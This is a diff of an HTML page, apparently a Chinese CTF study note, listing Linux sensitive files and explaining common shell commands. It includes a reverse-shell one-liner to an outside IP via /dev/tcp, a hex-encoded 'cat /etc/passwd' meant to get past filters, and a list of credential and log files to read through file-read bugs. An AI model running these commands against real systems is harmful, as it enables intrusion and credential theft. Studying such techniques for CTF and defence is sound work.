@@ -225,33 +225,35 @@
         <div class="post-content">
             <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本节简单纪录了一些linux常用命令和linux敏感文件</p>
 <span id="more"></span>
-<h3 id="linux-文件"><a href="#linux-文件" class="headerlink" title="linux 文件"></a>linux 文件</h3><h4 id="home目录"><a href="#home目录" class="headerlink" title="home目录"></a>home目录</h4><p>.bash_history 文件是记录用户在shell中输入的所有命令历史的文件，可以通过输入 history 命令查看。它通常存储在当前用户的 home 目录中</p>
+<h2 id="linux-文件"><a href="#linux-文件" class="headerlink" title="linux 文件"></a>linux 文件</h2><h3 id="home目录"><a href="#home目录" class="headerlink" title="home目录"></a>home目录</h3><p>.bash_history 文件是记录用户在shell中输入的所有命令历史的文件，可以通过输入 history 命令查看。它通常存储在当前用户的 home 目录中</p>
 <p>读取/etc/passwd文件内容<br>www:x:1002:1002::/home/www:/sbin/nologin<br>记录用户名www及其workdir：/home/www/；读取/home/www/.bash_history，发现服务器的历史命令：</p>
-<h4 id="etc目录"><a href="#etc目录" class="headerlink" title="etc目录"></a>etc目录</h4><p>/etc/passwd<br>文件是Linux系统保存用户信息及其工作目录的文件，权限是所有用户/组可读，一般被用作Linux系统下文件读取漏洞存在性判断的基准。读到这个文件我们就可以知道系统存在哪些用户、他们所属的组是什么、工作目录是什么<br>/etc/shadow 用于存储用户的加密密码和与密码相关的其他安全信息<br>/etc/(cron.d/*|crontab)<br>定时任务文件<br>etc/environment是环境变量配置文件之一,可能存在大量目录信息的泄露<br>/etc/hostname表示主机名<br>/etc/hosts是主机名查询静态表，包含指定域名解析IP的成对信息。通过这个文件，参赛者可以探测网卡信息和内网IP/域名</p>
-<h4 id="proc目录"><a href="#proc目录" class="headerlink" title="proc目录"></a>proc目录</h4><p>/proc 目录是一个虚拟文件系统，提供了关于系统内核、进程、硬件以及系统状态的实时信息。/proc 目录中的文件和子目录并不存储在磁盘上，而是由内核动态生成和维护的。它为用户和程序提供了一个与内核交互的接口。<br>/proc/version     内核信息<br>/proc/sched_debug 正在运行的进程信息<br>/proc/net/wireless 无线网卡信息和基础信息</p>
+<h3 id="etc目录"><a href="#etc目录" class="headerlink" title="etc目录"></a>etc目录</h3><p>/etc/passwd<br>文件是Linux系统保存用户信息及其工作目录的文件，权限是所有用户/组可读，一般被用作Linux系统下文件读取漏洞存在性判断的基准。读到这个文件我们就可以知道系统存在哪些用户、他们所属的组是什么、工作目录是什么<br>/etc/shadow 用于存储用户的加密密码和与密码相关的其他安全信息<br>/etc/(cron.d/*|crontab)<br>定时任务文件<br>etc/environment是环境变量配置文件之一,可能存在大量目录信息的泄露<br>/etc/hostname表示主机名<br>/etc/hosts是主机名查询静态表，包含指定域名解析IP的成对信息。通过这个文件，参赛者可以探测网卡信息和内网IP/域名</p>
+<h3 id="proc目录"><a href="#proc目录" class="headerlink" title="proc目录"></a>proc目录</h3><p>/proc 目录是一个虚拟文件系统，提供了关于系统内核、进程、硬件以及系统状态的实时信息。/proc 目录中的文件和子目录并不存储在磁盘上，而是由内核动态生成和维护的。它为用户和程序提供了一个与内核交互的接口。<br>/proc/version     内核信息<br>/proc/sched_debug 正在运行的进程信息<br>/proc/net/wireless 无线网卡信息和基础信息</p>
 <p>pid是进程的标号：<br>/proc/pid/cmdline 是一个只读文件，包含进程的完整命令行信息<br>/proc/pid/cwd     包含了当前进程工作目录的一个链接<br>/proc/pid/environ 包含了可用进程环境变量的列表<br>/proc/1/environ</p>
 <p>self即当前进程<br>/proc/self/cmdline      当前进程的完整命令<br>/proc/self/maps         查看当前进程的内存映射关系<br>cat /proc/self/cmdline  当前进程的完整命令<br>ls -al /proc/self/cwd   获取目标当前进程环境的运行目录<br>ls -al /proc/self/exe   获得当前进程的可执行文件的完整路径<br>cat /proc/self/environ  获取当前进程的环境变量信息<br>cat /proc/self/fd/{id}  获取当前进程打开的文件内容<br>/proc/net/arp<br>/proc/net/fib_trie</p>
-<h4 id="其他目录"><a href="#其他目录" class="headerlink" title="其他目录"></a>其他目录</h4><p>redis<br>/etc/redis.conf</p>
+<h3 id="系统日志目录"><a href="#系统日志目录" class="headerlink" title="系统日志目录"></a>系统日志目录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Linux的日志存储在/var/log中</span><br><span class="line"></span><br><span class="line">wtmp 记录登录进入、退出、数据交换、关机和重启</span><br><span class="line">cron 记录与定时任务相关的日志信息</span><br><span class="line">messages 记录系统启动后的信息和错误日志</span><br><span class="line">apache2/access.log 记录Apache的访问日志</span><br><span class="line">auth.log 记录系统授权信息，包括用户登录和使用的权限机制等</span><br><span class="line">userlog 记录所有等级用户信息的日志</span><br><span class="line">xferlog（vsftpd.log） 记录Linux FTP日志</span><br><span class="line">lastlog 记录登录的用户，可以使用命令lastlog查看</span><br><span class="line">secure 记录大多数应用输入的账号与密码，以及登录成功与否</span><br><span class="line">faillog 记录登录系统不成功的账号信息</span><br></pre></td></tr></table></figure>
+
+<h3 id="其他目录"><a href="#其他目录" class="headerlink" title="其他目录"></a>其他目录</h3><p>redis<br>/etc/redis.conf</p>
 <p>ssh<br>/etc/ssh/sshd_config</p>
 <p>tomcat<br>/usr/local/tomcat/conf/tomcat-users.xml<br>可以先找到/tomcat/bin/catalina.sh，里边有log的配置路径<br>/webapps/ROOT/logs/catalina.out</p>
 <p>apache<br>/etc/httpd/conf/httpd.conf<br>/etc/apache2/apache2.conf<br>/etc/apache2/httpd.conf<br>/var/log/apache2/access.log<br>/var/log/apache2/error.log<br>/var/log/httpd/access_log<br>/etc/httpd/logs/access_log<br>/etc/httpd/logs/error_log<br>/etc/httpd/logs/error.log</p>
 <p>nginx<br>/www/nginx/conf/nginx.conf<br>/etc/nginx/nginx.conf<br>/usr/local/nginx/conf/nginx.conf<br>/usr/local/etc/nginx/nginx.conf<br>/var/log/nginx/access.log<br>/var/log/nginx/error.log<br>/usr/local/var/log/nginx/access.log<br>/usr/local/nginx/logs</p>
-<h3 id="linux命令"><a href="#linux命令" class="headerlink" title="linux命令"></a>linux命令</h3><p>在类 Unix 系统中，<strong>PATH</strong> 是一个环境变量，它告诉 shell（如 Bash、Zsh）在哪些目录下查找可执行的命令。当你输入一个命令时，系统会按照 PATH 变量中的路径顺序，逐一查找该命令对应的可执行文件。</p>
+<h2 id="linux命令"><a href="#linux命令" class="headerlink" title="linux命令"></a>linux命令</h2><p>在类 Unix 系统中，<strong>PATH</strong> 是一个环境变量，它告诉 shell（如 Bash、Zsh）在哪些目录下查找可执行的命令。当你输入一个命令时，系统会按照 PATH 变量中的路径顺序，逐一查找该命令对应的可执行文件。</p>
 <p>如果 /usr/bin 目录包含在 PATH 中（通常是默认配置），那么你可以直接在终端中输入该目录下的命令，系统会自动在 /usr/bin 目录中找到并执行它</p>
 <p><code>echo $PATH</code>查看 PATH 环境变量</p>
 <p>/bin 存放的是系统引导和修复所需的基础命令,例如 ls, cp, mv, rm, cat, sh 等<br>/usr/bin 存放的是常用的用户命令和应用程序,例如，文本编辑器（如 vim）、编译器（如 gcc）、各种脚本语言的解释器（如 python, perl）等。</p>
-<h4 id="shell命令"><a href="#shell命令" class="headerlink" title="shell命令"></a>shell命令</h4><p>bash -c 命令</p>
+<h3 id="shell命令"><a href="#shell命令" class="headerlink" title="shell命令"></a>shell命令</h3><p>bash -c 命令</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:  bash -c whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
 <p>bash -i 命令<br>以交互方式运行shell</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#    目标主机：</span></span><br><span class="line">root@kali:  bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/120.46.41.173/9023 0&gt;&amp;1&quot;</span></span><br><span class="line"><span class="comment">#    接受主机：</span></span><br><span class="line">nc -lvp 2222</span><br></pre></td></tr></table></figure>
-<h4 id="输出命令"><a href="#输出命令" class="headerlink" title="输出命令"></a>输出命令</h4><p>1.printf<br>printf 命令模仿 C 程序库（library）里的 printf() 程序,功能相近<br><code>$(printf &quot;\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&quot;)</code><br>也可以简化<br><code> $&#39;\154\163&#39;</code>ls</p>
-<h4 id="管理目录"><a href="#管理目录" class="headerlink" title="管理目录"></a>管理目录</h4><ol>
+<h3 id="输出命令"><a href="#输出命令" class="headerlink" title="输出命令"></a>输出命令</h3><p>1.printf<br>printf 命令模仿 C 程序库（library）里的 printf() 程序,功能相近<br><code>$(printf &quot;\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&quot;)</code><br>也可以简化<br><code> $&#39;\154\163&#39;</code>ls</p>
+<h3 id="管理目录"><a href="#管理目录" class="headerlink" title="管理目录"></a>管理目录</h3><ol>
 <li>cd命令(change directory)<br>~ 也表示为当前用户的家目录，. 则是表示目前所在的目录， .. 则表示目前目录位置的上一层目录。<br> cd        进入用户主目录<br> cd -      返回进入此目录之前所在目录<br> cd ..     返回上一级目录<br> cd ../..  返回上两级目录<br> cd !$    把上个命令的参数作为cd 参数使用<br> cd .      当前目录</li>
 <li>ls命令(list)<br>ls 命令不仅可以查看 linux 文件夹包含的文件，而且可以查看文件权限<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ls 文件名，若文件存在，输出文件名</span><br><span class="line">ls -a     列出目录所有文件，包含以.开始的隐藏文件</span><br><span class="line">ls -r     反序排列</span><br><span class="line">ls -R     递归处理，将指定目录下的所有文件及子目录一并处理；</span><br><span class="line">ls -t     以文件修改时间排序</span><br><span class="line">ls -S     以文件大小排序</span><br><span class="line"></span><br><span class="line">ls -l(ll) 除了文件名之外，还将文件的权限、所有者、文件大小等信息详细列出来</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/QQ%E6%88%AA%E5%9B%BE20220715162727.png" alt="QQ截图20220715162727"></li>
 </ol>
 <p>蓝色表示目录; 绿色表示可执行文件; 红色表示压缩文件; 浅蓝色表示链接文件; 灰色表示其它文件; 红色闪烁表示链接的文件有问题了; 黄色是设备文件<br>3. dir命令(和 ls 命令类似)只不过用ls写入文件中时，每个文件名都是单独一行，它会自动换行，但dir就会全部写入一行中，并且会自动加空格<br>4. pwd 命令(print work directory)<br>用于查看当前工作目录路径,查看软链接的实际路径<code>pwd -P</code></p>
-<h4 id="目录和文件操作"><a href="#目录和文件操作" class="headerlink" title="目录和文件操作"></a>目录和文件操作</h4><ol>
+<h3 id="目录和文件操作"><a href="#目录和文件操作" class="headerlink" title="目录和文件操作"></a>目录和文件操作</h3><ol>
 <li><p>mkdir命令(make directory) 用于创建文件夹</p>
 </li>
 <li><p>rmdir命令<br>注意：rmdir删除的目录dir必须是空目录，否则删除不掉dir这个目录。</p>
@@ -263,12 +265,12 @@
 <li><p>cp 命令(copy)</p>
 </li>
 </ol>
-<p> -f：覆盖已经存在的目标文件而不给出提示。<br> -p：除复制文件的内容外，还把修改时间和访问权限也复制到新文件中。<br> -r或-R：递归处理，将指定目录下的子文件和子目录一并处理（复制目录的时候使用）<br><code>[root@tjf328 ~]# cp  /root/a.txt  /tmp/</code><br>6. find命令<br>用来在指定目录下查找文件 <code>find [path] [expression]</code><br>实例：<br>将当前目录及其子目录下所有文件后缀为 .c 的文件列出来:<br><code># find . -name &quot;*.c&quot;</code><br>寻找根目录下所以flag开头的文件<br><code>find / -name flag*</code><br>三天内新加或修改的文件：<br>find . -type f -mtime -3</p>
+<p> -f：覆盖已经存在的目标文件而不给出提示。<br> -p：除复制文件的内容外，还把修改时间和访问权限也复制到新文件中。<br> -r或-R：递归处理，将指定目录下的子文件和子目录一并处理（复制目录的时候使用）<br><code>[root@tjf328 ~]# cp  /root/a.txt  /tmp/</code><br>6. find命令<br>用来在指定目录下查找文件 <code>find [path] [expression]</code><br>实例：<br>将当前目录及其子目录下所有文件后缀为 .c 的文件列出来:<br><code># find . -name &quot;*.c&quot;</code><br>寻找根目录下所以flag开头的文件<br><code>find / -name flag*</code><br>三天内新加或修改的文件：<br><code>find . -type f -mtime -3</code></p>
 <ol start="7">
 <li>rm 命令(remove)<br>可以直接使用 rm 命令删除文件； </li>
 </ol>
-<p>-r ：是 rm 命令的可选项，表示递归处理，将指定目录下的所有文件与子目录一并处理；<br>-f ：是 rm 命令的可选项，表示强制删除文件或目录<br>8. sh命令<br>将文件中的内容当作命令来执行，同时.也可以执行命令<br>例如：<br>. \a=sh \a</p>
-<h4 id="文本操作"><a href="#文本操作" class="headerlink" title="文本操作"></a>文本操作</h4><p>grep 更适合单纯的查找或匹配文本<br>sed  更适合编辑匹配到的文本<br>awk  更适合格式化文本，对文本进行较复杂格式处理</p>
+<p>-r ：是 rm 命令的可选项，表示递归处理，将指定目录下的所有文件与子目录一并处理；<br>-f ：是 rm 命令的可选项，表示强制删除文件或目录<br>8. sh命令<br>将文件中的内容当作命令来执行，同时.也可以执行命令<br>例如：<br><code>. \a=sh \a</code></p>
+<h3 id="文本操作"><a href="#文本操作" class="headerlink" title="文本操作"></a>文本操作</h3><p>grep 更适合单纯的查找或匹配文本<br>sed  更适合编辑匹配到的文本<br>awk  更适合格式化文本，对文本进行较复杂格式处理</p>
 <ol>
 <li>grep 命令<br>grep 指令会把含有范本样式的那一列显示出来,常用于文本搜索和选择输出<br>格式： grep -ira “flag{“ / 2&gt;/dev/null</li>
 </ol>
@@ -286,7 +288,7 @@
 <li>tee<br>用于读取标准输入的数据，并将其内容输出成文件,常用做写日志</li>
 </ol>
 <p>-a或–append 　附加到既有文件的后面，而非覆盖它</p>
-<h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><ol>
+<h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><ol>
 <li>cat 命令(concatenate)<br>用于连接文件并打印到标准输出设备上</li>
 <li>tac<br>Linux常用命令tac 刚好是将 cat 反写过来,所以他的功能就跟 cat 相反啦,<br>即tac 则是“ 由最后一行到第一行反向在屏幕上显示出来,行内的顺序不变</li>
 <li>more 命令<br>cat的升级版, more 会以一页一页的显示方便使用者逐页阅读，而最基本的指令就是按空白键（space）就往下一页显示，按 b 键就会往回（back）一页显示。<br>（1）显示文件中从第3行起的内容<br>more +3 text.txt<br>（2）在所列出文件目录详细信息，借助管道使每次显示 5 行<br>ls -l | more -5</li>
@@ -296,7 +298,7 @@
 <li>nl<br>nl可以将输出的文件内容前自动的加上行号,整体来说，nl主要是对行号做更多的修饰。</li>
 <li> rev命令<br>把每一行字符的顺序颠倒过来显示文件内容<br>若其后跟的是文件,则将文件每一行颠倒,但行的顺序不变</li>
 </ol>
-<h4 id="文件所有权和访问权限"><a href="#文件所有权和访问权限" class="headerlink" title="文件所有权和访问权限"></a>文件所有权和访问权限</h4><p><strong>ll命令详解</strong><br>文件类型<br>常规文件(-) ：文本文件和二进制文件<br>目录文件(d) ：目录文件是文件系统中一个目录所包含的目录项所组成的文件<br>设备文件(c or b) ：每种I/O设备对应一个设备文件，存放在 /dev 目录中。<br>管道文件(p) ：主要用于在进程间传递数据 ，又称先进先出(FIFO)文件<br>链接文件(L) ：链接又可以分为软链接（符号链接）和硬链接，它提供了共享文件的一种方法。</p>
+<h3 id="文件所有权和访问权限"><a href="#文件所有权和访问权限" class="headerlink" title="文件所有权和访问权限"></a>文件所有权和访问权限</h3><p><strong>ll命令详解</strong><br>文件类型<br>常规文件(-) ：文本文件和二进制文件<br>目录文件(d) ：目录文件是文件系统中一个目录所包含的目录项所组成的文件<br>设备文件(c or b) ：每种I/O设备对应一个设备文件，存放在 /dev 目录中。<br>管道文件(p) ：主要用于在进程间传递数据 ，又称先进先出(FIFO)文件<br>链接文件(L) ：链接又可以分为软链接（符号链接）和硬链接，它提供了共享文件的一种方法。</p>
 <p>r：目录执行ls以列出目录内容；                             文件可读<br>w：目录创建、删除文件；                                   文件可写<br>x：可以cd切换进此目录，也可以使用ll查看内部文件的详细信息；  文件可执行</p>
 <p>ls -l(ll) 除了文件名之外，还将文件的权限、所有者、文件大小等信息详细列出来<br>             7  rw  5  r  3  w  x    </p>
 <ul>
@@ -309,10 +311,10 @@
 <ol>
 <li>改变所属的用户组<br>chrgp [选项] 组名 文件名</li>
 <li>改变所有者<br>chown [选项] 用户:组 文件名</li>
-<li>修改文件访问权限<br>文字法<br>chmod a+w,o-x,ug–r 1.txt<br>数字法<br>chmod 644 2.txt<h4 id="文件编辑"><a href="#文件编辑" class="headerlink" title="文件编辑"></a>文件编辑</h4><h5 id="vi与vim的区别"><a href="#vi与vim的区别" class="headerlink" title="vi与vim的区别"></a>vi与vim的区别</h5>vi编辑器只能运行于unix中，而vim不仅可以运行于unix，还可用于windows、mac等多操作平台。<br>vim可以用不同的颜色来加亮你的代码。vi使用于文本编辑，但是vim更适用于coding<h5 id="模式转换"><a href="#模式转换" class="headerlink" title="模式转换"></a>模式转换</h5></li>
+<li>修改文件访问权限<br>文字法<br>chmod a+w,o-x,ug–r 1.txt<br>数字法<br>chmod 644 2.txt<h3 id="文件编辑"><a href="#文件编辑" class="headerlink" title="文件编辑"></a>文件编辑</h3><h4 id="vi与vim的区别"><a href="#vi与vim的区别" class="headerlink" title="vi与vim的区别"></a>vi与vim的区别</h4>vi编辑器只能运行于unix中，而vim不仅可以运行于unix，还可用于windows、mac等多操作平台。<br>vim可以用不同的颜色来加亮你的代码。vi使用于文本编辑，但是vim更适用于coding<h4 id="模式转换"><a href="#模式转换" class="headerlink" title="模式转换"></a>模式转换</h4></li>
 </ol>
 <p><strong>正常–&gt;输入</strong><br>i：在当前光标所在字符的前面，转为输入模式；<br>o：在当前光标所在行的下方，新建一行，并转为输入模式<br><strong>输入–&gt;正常</strong>：<br>            ESC<br><strong>正常–&gt;末行</strong>:<br>            :(英文冒号)<br><strong>末行–&gt;正常</strong>：<br>            ESC</p>
-<h5 id="末行模式"><a href="#末行模式" class="headerlink" title="末行模式"></a>末行模式</h5><ol>
+<h4 id="末行模式"><a href="#末行模式" class="headerlink" title="末行模式"></a>末行模式</h4><ol>
 <li>保存退出<pre><code> :q        退出；
  :w        保存；
  :wq        保存退出
@@ -329,7 +331,7 @@
 </ol>
 <p>:/查找内容 从光标所在行向下查找<br>:?查找内容 从光标所在行向上查找<br>n 下一个<br>N 上一个</p>
 <ol start="4">
-<li>替换<br>:1,10s/old/new/g<br>:%s/old/new/g(% 是一个变量，在这里代表整篇文档）<h5 id="正常模式"><a href="#正常模式" class="headerlink" title="正常模式"></a>正常模式</h5></li>
+<li>替换<br>:1,10s/old/new/g<br>:%s/old/new/g(% 是一个变量，在这里代表整篇文档）<h4 id="正常模式"><a href="#正常模式" class="headerlink" title="正常模式"></a>正常模式</h4></li>
 <li>行内跳转：<pre><code> 0: 绝对行首；
  $: 绝对行尾
 </code></pre>
@@ -343,16 +345,16 @@
 <h4 id="用户权限"><a href="#用户权限" class="headerlink" title="用户权限"></a>用户权限</h4><p>使用id 用户名，查看指定用户所属组</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ id</span><br><span class="line">uid=1000(team2) gid=1000(team2) groups=1000(team2)</span><br></pre></td></tr></table></figure>
 <p>普通用户只能改变自己的文件或文件夹权限<br>root用户可以更改所有用户的权限</p>
-<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><ol>
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol>
 <li> ln命令<br>在链接目标目录中修改文件都会在源文件目录中同步变化。<br>软连接：ln –s 源文件 链接文件<br>是在选定的地方生成一个文件的映射，映射文件不占用磁盘空间，软链接可以 跨文件系统 ，硬链接不可以<br>修改存在的软连接： ln -nsf 源文件 链接文件</li>
 </ol>
 <p>硬链接：ln 源文件 链接文件<br>是在选定的位置生成一个文件的镜像，镜像文件与源文件同样大小，但不占用实际空间，不允许给目录创建硬链接。<br>删除链接：unlink 链接文件</p>
-<h3 id="常见符号"><a href="#常见符号" class="headerlink" title="常见符号"></a>常见符号</h3><h4 id="转义字符"><a href="#转义字符" class="headerlink" title="\ 转义字符"></a>\ 转义字符</h4><p>放在特殊符号前，则该特殊符号的作用消失，放在指令的最末端，表示指令连接下一行</p>
-<h4 id="lt-输出重定向"><a href="#lt-输出重定向" class="headerlink" title="&lt;输出重定向"></a>&lt;输出重定向</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">命令 &lt; 文件 	        将指定文件作为命令的输入设备</span><br><span class="line">命令 &lt; 文件 1 &gt; 文件 2 	将文件 1 作为命令的输入设备，该命令的执行结果输出到文件 2 中。</span><br><span class="line"></span><br><span class="line">命令 &lt;&lt; 分界符 	      “&lt;&lt;”则是一种特殊的重定向，是输入内容重定向到一个命令或脚本。</span><br><span class="line">ubuntu@VM-12-3-ubuntu:/$ ls &lt;&lt;eor</span><br><span class="line">&gt; eor</span><br><span class="line">apache2.conf  boot   data  docker </span><br><span class="line"></span><br><span class="line">命令 &lt;&lt;&lt; 参数         将指定字符串参数作为命令的输入</span><br><span class="line">ubuntu@VM-12-3-ubuntu:/$ ls&lt;&lt;&lt;/</span><br><span class="line">apache2.conf  boot   data  docker </span><br><span class="line">bash&lt;&lt;&lt;ls</span><br><span class="line">apache2.conf  boot   data  docker </span><br><span class="line">passwd --stdin root  &lt;&lt;&lt; &quot;123456&quot;== echo &quot;123456&quot; | passwd --stdin root</span><br></pre></td></tr></table></figure>
-<h4 id="gt-表示覆盖内容"><a href="#gt-表示覆盖内容" class="headerlink" title="&gt; 表示覆盖内容"></a>&gt; 表示覆盖内容</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1, 通过&gt;来创建文件</span><br><span class="line"></span><br><span class="line">&gt;flag.txt</span><br><span class="line"></span><br><span class="line">2，通过&gt;将命令结果存入文件中</span><br><span class="line"></span><br><span class="line">echo &quot;hello hacker&quot; &gt; flag.txt</span><br><span class="line"></span><br><span class="line">3，&gt;&gt;符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容</span><br><span class="line"></span><br><span class="line">echo &quot;hello hacker&quot; &gt;&gt; flag.txt</span><br></pre></td></tr></table></figure>
-<h4 id="‘’，””引号"><a href="#‘’，””引号" class="headerlink" title="‘’，””引号"></a>‘’，””引号</h4><p>单引号’’剥夺了所有字符的特殊含义，单引号’’内就变成了单纯的字符。<br>双引号””则对于双引号””内的参数替换($)和命令替换(``)是个例外。</p>
-<h4 id="花括号"><a href="#花括号" class="headerlink" title="{}花括号"></a>{}花括号</h4><p>如touch {a,b}.txt 结果为a.txt b.txt。<br>如：touch {a…d}.txt 结果为a.txt b.txt c.txt d.txt。</p>
-<h4 id="Linux中-、-、-的功能"><a href="#Linux中-、-、-的功能" class="headerlink" title="Linux中$ {}、$()、$(())的功能"></a>Linux中<code>$ &#123;&#125;</code>、<code>$()</code>、<code>$(())</code>的功能</h4><p><strong>${}</strong></p>
+<h2 id="常见符号"><a href="#常见符号" class="headerlink" title="常见符号"></a>常见符号</h2><h3 id="转义字符"><a href="#转义字符" class="headerlink" title="\ 转义字符"></a>\ 转义字符</h3><p>放在特殊符号前，则该特殊符号的作用消失，放在指令的最末端，表示指令连接下一行</p>
+<h3 id="lt-输出重定向"><a href="#lt-输出重定向" class="headerlink" title="&lt;输出重定向"></a>&lt;输出重定向</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">命令 &lt; 文件 	        将指定文件作为命令的输入设备</span><br><span class="line">命令 &lt; 文件 1 &gt; 文件 2 	将文件 1 作为命令的输入设备，该命令的执行结果输出到文件 2 中。</span><br><span class="line"></span><br><span class="line">命令 &lt;&lt; 分界符 	      “&lt;&lt;”则是一种特殊的重定向，是输入内容重定向到一个命令或脚本。</span><br><span class="line">ubuntu@VM-12-3-ubuntu:/$ ls &lt;&lt;eor</span><br><span class="line">&gt; eor</span><br><span class="line">apache2.conf  boot   data  docker </span><br><span class="line"></span><br><span class="line">命令 &lt;&lt;&lt; 参数         将指定字符串参数作为命令的输入</span><br><span class="line">ubuntu@VM-12-3-ubuntu:/$ ls&lt;&lt;&lt;/</span><br><span class="line">apache2.conf  boot   data  docker </span><br><span class="line">bash&lt;&lt;&lt;ls</span><br><span class="line">apache2.conf  boot   data  docker </span><br><span class="line">passwd --stdin root  &lt;&lt;&lt; &quot;123456&quot;== echo &quot;123456&quot; | passwd --stdin root</span><br></pre></td></tr></table></figure>
+<h3 id="gt-表示覆盖内容"><a href="#gt-表示覆盖内容" class="headerlink" title="&gt; 表示覆盖内容"></a>&gt; 表示覆盖内容</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1, 通过&gt;来创建文件</span><br><span class="line"></span><br><span class="line">&gt;flag.txt</span><br><span class="line"></span><br><span class="line">2，通过&gt;将命令结果存入文件中</span><br><span class="line"></span><br><span class="line">echo &quot;hello hacker&quot; &gt; flag.txt</span><br><span class="line"></span><br><span class="line">3，&gt;&gt;符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容</span><br><span class="line"></span><br><span class="line">echo &quot;hello hacker&quot; &gt;&gt; flag.txt</span><br></pre></td></tr></table></figure>
+<h3 id="‘’，””引号"><a href="#‘’，””引号" class="headerlink" title="‘’，””引号"></a>‘’，””引号</h3><p>单引号’’剥夺了所有字符的特殊含义，单引号’’内就变成了单纯的字符。<br>双引号””则对于双引号””内的参数替换($)和命令替换(``)是个例外。</p>
+<h3 id="花括号"><a href="#花括号" class="headerlink" title="{}花括号"></a>{}花括号</h3><p>如touch {a,b}.txt 结果为a.txt b.txt。<br>如：touch {a…d}.txt 结果为a.txt b.txt c.txt d.txt。</p>
+<h3 id="Linux中-、-、-的功能"><a href="#Linux中-、-、-的功能" class="headerlink" title="Linux中$ {}、$()、$(())的功能"></a>Linux中<code>$ &#123;&#125;</code>、<code>$()</code>、<code>$(())</code>的功能</h3><p><strong>${}</strong></p>
 <ol>
 <li>对变量的替换，同$var。<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@cn21 ~]<span class="comment"># var=login</span></span><br><span class="line">[root@cn21 ~]<span class="comment"># echo &quot;aa$var&quot;</span></span><br><span class="line">aalogin</span><br><span class="line">[root@cn21 ~]<span class="comment"># echo &quot;$varaa&quot;</span></span><br><span class="line"></span><br><span class="line">[root@cn21 ~]<span class="comment"># echo &quot;$var aa&quot;</span></span><br><span class="line">login aa</span><br><span class="line">[root@cn21 ~]<span class="comment"># echo &quot;$&#123;var&#125;aa&quot; #注意此时大括号作用</span></span><br><span class="line">loginaa</span><br></pre></td></tr></table></figure></li>
 <li>变量间接引用<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-12-3-ubuntu:~$ <span class="built_in">echo</span> <span class="variable">$0</span></span><br><span class="line">-bash</span><br><span class="line">ubuntu@VM-12-3-ubuntu:~$ <span class="built_in">echo</span> <span class="variable">$&#123;!?&#125;</span></span><br><span class="line">-bash</span><br><span class="line">ubuntu@VM-12-3-ubuntu:~$ <span class="built_in">echo</span> <span class="variable">$&#123;!#&#125;</span></span><br><span class="line">-bash</span><br></pre></td></tr></table></figure></li>
@@ -367,7 +369,7 @@
 </li>
 <li><p>位运算</p>
